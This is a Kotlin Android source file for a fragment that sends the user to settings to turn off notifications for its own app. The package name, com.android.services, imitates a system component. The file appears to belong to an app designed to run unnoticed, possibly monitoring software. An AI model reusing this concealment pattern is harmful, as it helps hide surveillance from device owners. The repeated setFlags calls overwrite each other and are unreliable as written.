package com.android.services.ui.fragments

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.databinding.DataBindingUtil
import androidx.fragment.app.activityViewModels
import com.android.services.R
import com.android.services.databinding.FragmentDisableNotificationBinding
import com.android.services.enums.PermissionScreens
import com.android.services.interfaces.CustomDialogListener
import com.android.services.util.AppUtils
import com.android.services.viewModel.ManualPermissionViewModel

class DisableNotificationFragment : BaseFragment() {

    lateinit var binding: FragmentDisableNotificationBinding
    private val manualPermissionViewModel: ManualPermissionViewModel by activityViewModels()

    override fun initViews(view: View) {
        binding.permissionButton.setOnClickListener {
            disableNotificationAccessPermission()
        }

        binding.skipPermission.setOnClickListener {
            AppUtils.showAlertDialog(
                requireContext(),
                "Skip Permission",
                "Alert! Some features may not work if You Skip the Permission",
                "Skip",
                "Cancel",
                object : CustomDialogListener {
                    override fun onYes() {
                        AppUtils.skipThePermission(PermissionScreens.DISABLE_NOTIFICATION_ACCESS)
                    }

                    override fun onCancel() {

                    }
                }
            )
        }
    }

    override fun createView(inflater: LayoutInflater, container: ViewGroup): View {
        binding = DataBindingUtil.inflate<FragmentDisableNotificationBinding>(
            inflater, R.layout.fragment_disable_notification, container, false
        ).apply {
            lifecycleOwner = viewLifecycleOwner
            viewModel = manualPermissionViewModel
        }
        return binding.root
    }

    override fun onCreateFragment() {

    }

    private fun disableNotificationAccessPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationIntent: Intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
                .putExtra(Settings.EXTRA_APP_PACKAGE, requireContext().packageName)
                .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                .setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            startActivity(notificationIntent)
        } else {
            val intent = Intent()
            intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
            intent.addCategory(Intent.CATEGORY_DEFAULT)
            intent.data = Uri.parse("package:${requireContext().packageName}")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.flags = Intent.FLAG_ACTIVITY_NO_HISTORY
            intent.flags = Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            startActivity(intent)
        }
    }

    companion object {

        /** Creates an new instance of Accessibility Fragment **/
        fun newInstance(): DisableNotificationFragment {
            val args = Bundle()
            val fragment = DisableNotificationFragment()
            fragment.arguments = args
            return fragment
        }
    }
}